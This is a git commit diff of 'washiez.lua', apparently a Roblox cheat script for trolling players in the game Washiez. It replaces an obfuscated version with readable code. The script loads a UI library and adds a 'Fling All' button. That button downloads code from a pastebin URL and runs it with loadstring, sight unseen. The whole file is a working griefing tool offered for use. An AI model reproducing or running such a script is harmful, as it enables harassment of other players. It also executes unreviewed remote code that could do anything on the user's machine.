8d20e2459c547dba8d210a241b3a0abdd7657c45
rosploiter <vinnyaltzz@gmail.com>
2024-06-13 17:36:58 -0400

    Update washiez.lua

--- washiez.lua
+++ washiez.lua
@@ -1,12 +1,54 @@
+-- hi skids
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "WashiezFucker | Washiez Trolling Union", HidePremium = false, SaveConfig = true, ConfigFolder = "WashiezHub"})
+local Tab = Window:MakeTab({
+	Name = "Exploits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "Fling All (Buggy)",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/ztmBanCD"))()
+  	end    
+})
+
 --[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.5) ~  Much Love, Ferib 
-
-]]--
-
-local v0=loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))();local v1=v0:MakeWindow({Name="WashiezFucker | Washiez Trolling Union",HidePremium=false,SaveConfig=true,ConfigFolder="WashiezHub"});local v2=v1:MakeTab({Name="Exploits",Icon="rbxassetid://4483345998",PremiumOnly=false});v2:AddButton({Name="Fling All (Buggy)",Callback=function() loadstring(game:HttpGet("https://pastebin.com/raw/ztmBanCD"))();end});
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
